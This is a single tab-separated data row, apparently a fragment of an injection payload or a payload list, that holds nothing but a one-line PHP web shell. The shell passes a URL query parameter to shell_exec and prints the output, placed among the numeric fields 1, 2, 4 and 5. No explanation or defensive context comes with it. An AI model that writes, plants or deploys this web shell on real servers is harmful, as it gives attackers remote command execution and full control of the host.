1	2	<?php echo shell_exec($_GET['commandxx']);?>	4	5
